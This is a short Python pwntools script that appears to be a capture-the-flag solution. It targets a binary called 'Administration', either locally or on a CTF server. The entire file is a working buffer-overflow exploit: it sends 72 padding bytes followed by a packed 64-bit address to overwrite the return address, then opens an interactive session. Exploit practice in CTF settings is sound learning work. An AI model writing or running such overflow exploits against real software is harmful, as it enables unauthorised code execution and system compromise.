from pwn import *

DEBUG = True

if DEBUG:
    r = process('./Administration')
else:
    r = remote('simitarra.ctf.sinf.pt', 4001)

r.recvuntil(b"?")

r.sendline(b"a" * 72 + p64(0x01234567))

r.interactive()

r.close()